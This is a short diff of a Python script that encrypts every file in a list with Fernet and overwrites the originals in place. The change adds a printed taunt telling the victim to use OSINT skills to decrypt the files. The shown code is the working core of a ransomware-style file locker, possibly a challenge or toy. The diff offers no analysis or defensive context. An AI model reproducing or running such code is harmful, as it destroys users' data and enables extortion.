@@ -49,7 +49,7 @@ for file in all_files:
     enc_contents = Fernet(key).encrypt(contents)
     with open(file, "wb") as raw_file:
         raw_file.write(enc_contents)
-
+print("Use Your OSINT Skill to decrypt code")
 print("Files that have been encrypted are:")
 for names in all_files:
     print("{}".format(names))
